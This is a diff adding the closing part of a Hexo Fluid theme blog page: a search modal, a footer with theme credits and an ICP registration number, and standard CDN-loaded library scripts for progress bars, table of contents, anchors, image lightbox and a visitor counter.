+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      赣ICP备2022008842号-2
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
